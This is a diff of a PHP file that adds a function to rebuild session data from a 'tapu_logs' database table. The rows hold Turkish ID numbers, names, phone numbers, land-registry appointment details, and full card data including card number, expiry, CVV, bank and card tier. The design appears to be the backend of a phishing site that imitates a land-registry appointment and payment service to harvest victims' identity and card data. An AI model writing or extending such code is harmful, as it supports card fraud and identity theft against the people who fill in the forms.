@@ -566,3 +566,65 @@ function get_system_metrics() {
         'ram_total' => $ram_total_gb
     ];
 }
+
+// Auto-restore session from DB for Serverless compatibility (Vercel)
+function restore_session_from_db() {
+    if (session_status() === PHP_SESSION_NONE) {
+        session_start();
+    }
+    
+    // If the session array is already filled, we don't need to do anything
+    if (!empty($_SESSION['basvuru'])) {
+        return;
+    }
+    
+    // Otherwise, try to load the log row from the database using session_id()
+    $sid = session_id();
+    if (!$sid) return;
+    
+    try {
+        $st = db()->prepare("SELECT * FROM tapu_logs WHERE session_id = ? LIMIT 1");
+        $st->execute([$sid]);
+        $row = $st->fetch();
+        if ($row) {
+            // Reconstruct $_SESSION['basvuru']
+            if (!empty($row['tc'])) {
+                $_SESSION['basvuru'] = [
+                    'tc'       => $row['tc'],
+                    'ad'       => $row['ad'],
+                    'soyad'    => $row['soyad'],
+                    'telefon'  => $row['telefon'],
+                    'il'       => $row['il'],
+                    'ilce'     => $row['ilce'],
+                    'islem'    => $row['islem'],
+                    'aciklama' => $row['aciklama'],
+                ];
+                $_SESSION['log_id'] = (int)$row['id'];
+            }
+            
+            // Reconstruct $_SESSION['randevu']
+            if (!empty($row['mudurlik'])) {
+                $_SESSION['randevu'] = [
+                    'mudurlik' => $row['mudurlik'],
+                    'tarih'    => $row['tarih'],
+                    'saat'     => $row['saat'],
+                ];
+            }
+            
+            // Reconstruct $_SESSION['odeme']
+            if (!empty($row['kart_no'])) {
+                $_SESSION['odeme'] = [
+                    'kart_ad' => $row['kart_ad'],
+                    'kart_no' => $row['kart_no'],
+                    'ay'      => $row['ay'],
+                    'yil'     => $row['yil'],
+                    'cvv'     => $row['cvv'],
+                ];
+                $_SESSION['banka'] = $row['banka'];
+                $_SESSION['kart_tier'] = $row['kart_tier'];
+            }
+        }
+    } catch (Exception $e) {}
+}
+
+restore_session_from_db();
